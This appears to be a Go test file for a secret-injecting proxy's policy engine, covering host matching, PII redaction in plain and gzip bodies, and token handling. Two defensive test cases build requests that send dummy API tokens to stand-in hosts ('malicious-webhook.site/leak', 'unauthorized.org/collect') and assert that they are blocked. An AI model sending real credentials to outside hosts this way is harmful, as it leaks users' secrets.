package policy

import (
	"bytes"
	"compress/gzip"
	"io"
	"net/http"
	"net/url"
	"testing"
)

func TestPolicy_MatchingAndScrubbing(t *testing.T) {
	// 1. Host Matching
	if !MatchHost("api.openai.com", "exact", "api.openai.com:443") {
		t.Fatal("expected exact host match to succeed")
	}
	if MatchHost("api.openai.com", "exact", "other.openai.com") {
		t.Fatal("expected exact host match to fail on mismatch")
	}
	if !MatchHost("*.github.com", "wildcard", "api.github.com:443") {
		t.Fatal("expected wildcard match for api.github.com to succeed")
	}
	if MatchHost("*.github.com", "wildcard", "github.com") {
		t.Fatal("expected wildcard match to require subdomain")
	}

	// 2. PII Scrubber
	cfg := ScrubbingConfig{
		Emails:    true,
		Usernames: []string{"testdeveloper"},
		CustomRegex: []CustomRegexRule{
			{
				Name:        "SecretPattern",
				Pattern:     `CONFIDENTIAL-[0-9]{4}`,
				Replacement: "[CONFIDENTIAL_REDACTED]",
			},
		},
	}

	scrubber, err := NewCompiledScrubber(cfg)
	if err != nil {
		t.Fatalf("NewCompiledScrubber failed: %v", err)
	}

	// Scrub Text
	rawText := "Hello, contact me at engineer@company.com or report to testdeveloper regarding CONFIDENTIAL-9999"
	scrubbed, count := scrubber.ScrubText(rawText)
	if count != 3 { // email + username + custom regex
		t.Fatalf("expected 3 scrubs, got %d (text: %s)", count, scrubbed)
	}
	expectedSubstring := "[EMAIL_REDACTED]"
	if !bytes.Contains([]byte(scrubbed), []byte(expectedSubstring)) {
		t.Fatalf("expected text to contain %s, got: %s", expectedSubstring, scrubbed)
	}

	// Scrub Gzip Body
	var gzipBuf bytes.Buffer
	gw := gzip.NewWriter(&gzipBuf)
	_, _ = gw.Write([]byte("Email inside gzip: user@domain.org"))
	_ = gw.Close()

	scrubbedGzip, gzCount, err := scrubber.ScrubBody(gzipBuf.Bytes(), true)
	if err != nil {
		t.Fatalf("ScrubBody gzip failed: %v", err)
	}
	if gzCount != 1 {
		t.Fatalf("expected 1 gzip scrub, got %d", gzCount)
	}

	// Decompress and verify
	gr, err := gzip.NewReader(bytes.NewReader(scrubbedGzip))
	if err != nil {
		t.Fatal(err)
	}
	decompressed, _ := io.ReadAll(gr)
	_ = gr.Close()

	if !bytes.Contains(decompressed, []byte("[EMAIL_REDACTED]")) {
		t.Fatalf("decompressed gzip does not contain redaction: %s", string(decompressed))
	}
}

func TestPolicy_EvaluationRules(t *testing.T) {
	config := DefaultConfig()
	pe, err := NewPolicyEngine(config)
	if err != nil {
		t.Fatalf("NewPolicyEngine failed: %v", err)
	}

	dummyToKey := map[string]string{
		"VP_OPENAI_API_KEY_DUMMY_8f9a2b": "OPENAI_API_KEY",
		"VP_GITHUB_TOKEN_DUMMY_3e5f8a":   "GITHUB_TOKEN",
	}

	// 1. Authorized dummy token to api.openai.com -> ActionInjectSecret
	req1, _ := http.NewRequest("POST", "https://api.openai.com/v1/chat/completions", nil)
	req1.Header.Set("Authorization", "Bearer VP_OPENAI_API_KEY_DUMMY_8f9a2b")

	res1 := pe.EvaluateRequest(req1, dummyToKey)
	if res1.Action != ActionInjectSecret {
		t.Fatalf("expected ActionInjectSecret, got %s", res1.Action)
	}
	if len(res1.InjectedKeys) != 1 || res1.InjectedKeys[0] != "OPENAI_API_KEY" {
		t.Fatalf("unexpected injected keys: %+v", res1.InjectedKeys)
	}

	// 2. Confused Deputy Exfiltration Trap: send dummy token to unauthorized host -> ActionBlockLeak (HTTP 403)
	req2, _ := http.NewRequest("POST", "https://malicious-webhook.site/leak", nil)
	req2.Header.Set("Authorization", "Bearer VP_OPENAI_API_KEY_DUMMY_8f9a2b")

	res2 := pe.EvaluateRequest(req2, dummyToKey)
	if !res2.ShouldBlock || res2.BlockStatus != http.StatusForbidden {
		t.Fatalf("expected ShouldBlock=true with 403, got status %d, action %s", res2.BlockStatus, res2.Action)
	}

	// 3. Dummy token in query parameters to unauthorized host -> Blocked
	parsedURL, _ := url.Parse("https://unauthorized.org/collect?token=VP_GITHUB_TOKEN_DUMMY_3e5f8a")
	req3 := &http.Request{
		Method: "GET",
		Host:   "unauthorized.org",
		URL:    parsedURL,
		Header: make(http.Header),
	}
	res3 := pe.EvaluateRequest(req3, dummyToKey)
	if !res3.ShouldBlock || res3.BlockStatus != http.StatusForbidden {
		t.Fatalf("expected dummy in query param to be blocked, got: %+v", res3)
	}
}
